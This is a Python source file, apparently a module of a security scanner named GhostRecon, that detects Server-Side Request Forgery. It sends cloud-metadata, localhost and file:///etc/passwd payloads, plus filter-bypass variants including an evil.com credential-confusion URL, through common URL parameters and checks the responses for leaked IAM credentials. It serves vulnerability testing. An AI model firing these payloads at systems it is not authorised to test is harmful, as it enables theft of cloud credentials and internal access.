"""
SSRFModule — GhostRecon module.
Server-Side Request Forgery detection with false-positive-safe indicator checking.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from modules import BaseModule


# Signatures that strongly indicate the server fetched an internal/metadata URL.
METADATA_SIGNATURES = [
    "ami-id", "instance-id", "iam/security-credentials", "accountid",
    "computeMetadata", "kube-env", "root:x:0:", "oauth2/token",
    "access_token", "ssh-rsa", "metadata.google", "securityCredentials",
]

# Core SSRF targets plus common filter-bypass variants.
SSRF_PAYLOADS = [
    # AWS / GCP / Azure metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Localhost variants / internal
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    # Bypass variants
    "http://2130706433/",                 # decimal IP for 127.0.0.1
    "http://0x7f000001/",                 # hex IP
    "http://127.0.0.1.nip.io/",           # DNS that resolves to localhost
    "http://169.254.169.254\\@evil.com/",  # credential confusion
]

SSRF_PARAMS = ["url", "redirect", "next", "return", "callback", "fetch",
               "load", "link", "src", "uri", "path", "target", "dest",
               "destination", "image", "img", "proxy", "feed", "host", "site"]


class SSRFModule(BaseModule):
    NAME = "SSRF"

    def run(self):
        self.ui.section("SSRF — Server-Side Request Forgery Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        ssrf_params  = ["url", "redirect", "next", "return", "callback", "fetch",
                        "load", "link", "src", "uri", "path", "target", "dest", "destination",
                        "proxy", "site", "html", "val", "data", "domain", "feed"]

        # Each payload has indicators that are NOT substrings of the payload URL itself
        # This fixes the critical bug where the old code matched "computeMetadata"
        # which appears in the payload URL http://metadata.google.internal/computeMetadata/v1/
        ssrf_tests = [
            {
                "payload": "http://169.254.169.254/latest/meta-data/",
                "name": "AWS EC2 Metadata",
                # These strings appear in actual AWS metadata responses, NOT in the URL
                "indicators": ["ami-id", "instance-id", "local-hostname", "public-hostname",
                               "security-credentials", "instance-type", "availability-zone"],
            },
            {
                "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "name": "AWS IAM Credentials",
                "indicators": ["AccessKeyId", "SecretAccessKey", "Token"],
            },
            {
                "payload": "http://metadata.google.internal/computeMetadata/v1/instance/",
                "name": "GCP Metadata",
                # These appear in GCP metadata responses, not in URL
                "indicators": ["machineType", "zone/", "serviceAccounts", "network-interfaces"],
            },
            {
                "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "name": "Azure IMDS",
                "indicators": ["vmId", "subscriptionId", "resourceGroupName"],
            },
        ]

        s = self._session()
        found = 0

        # Get a baseline response to compare against
        baseline_resp = None
        try:
            baseline_resp = s.get(self.base_url, timeout=self.timeout)
        except Exception:
            pass

        for param in ssrf_params:
            for test in ssrf_tests:
                payload = test["payload"]
                url = f"{self.base_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    resp = s.get(url, timeout=self.timeout)

                    # ── FP Fix: Check each indicator is NOT just the payload URL reflected ──
                    for indicator in test["indicators"]:
                        if indicator in resp.text:
                            # Verify the indicator isn't just the payload URL being reflected
                            # Remove all occurrences of the payload URL from response body
                            cleaned_body = resp.text.replace(payload, "")
                            cleaned_body = cleaned_body.replace(urllib.parse.quote(payload), "")
                            cleaned_body = cleaned_body.replace(urllib.parse.unquote(payload), "")

                            if indicator in cleaned_body:
                                # Also verify this indicator doesn't appear in baseline response
                                if baseline_resp and indicator in baseline_resp.text:
                                    # Indicator is already in the page without SSRF — FP
                                    continue

                                self.db.add(
                                    title=f"SSRF via '{param}' Parameter — {test['name']} Accessible",
                                    severity="critical", url=self.base_url, module=self.NAME,
                                    description=(
                                        f"The '{param}' parameter makes the server fetch arbitrary URLs. "
                                        f"{test['name']} endpoint returned indicator '{indicator}'. "
                                        "An attacker can access cloud credentials and internal services."
                                    ),
                                    remediation=(
                                        "Whitelist allowed URL schemes and destinations. Block access to "
                                        "RFC1918 and cloud metadata IP ranges at the network level. "
                                        "Disable URL fetch functionality if not needed."
                                    ),
                                    cvss="9.1",
                                    confidence="CONFIRMED",
                                    confidence_score=95,
                                    validation_steps=["indicator_not_in_payload_url", "indicator_not_in_baseline", "indicator_in_cleaned_body"],
                                )
                                self.ui.find("critical", f"SSRF — {test['name']} via '{param}'", self.base_url)
                                found += 1
                                break  # One confirmed indicator is enough

                    time.sleep(self.delay)
                except Exception:
                    continue

        if found == 0:
            self.ui.info("No SSRF vulnerabilities detected.")

